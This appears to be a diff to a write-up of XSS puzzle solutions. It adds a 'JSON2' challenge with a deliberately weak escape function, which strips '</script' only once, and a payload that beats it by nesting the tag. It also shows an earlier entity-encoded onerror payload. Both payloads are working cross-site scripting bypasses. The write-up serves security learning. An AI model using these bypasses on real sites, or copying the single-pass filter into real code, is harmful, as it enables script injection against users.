@@ -102,3 +102,22 @@ function escape(s) {
 ```
 </script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
 ```
+
+
+### JSON2
+
+- Task
+
+```
+function escape(s) {
+  s = JSON.stringify(s).replace(/<\/script/gi, '');
+
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+
+- Solution
+
+```
+</scrip</scriptt><script>alert(1)//
+```
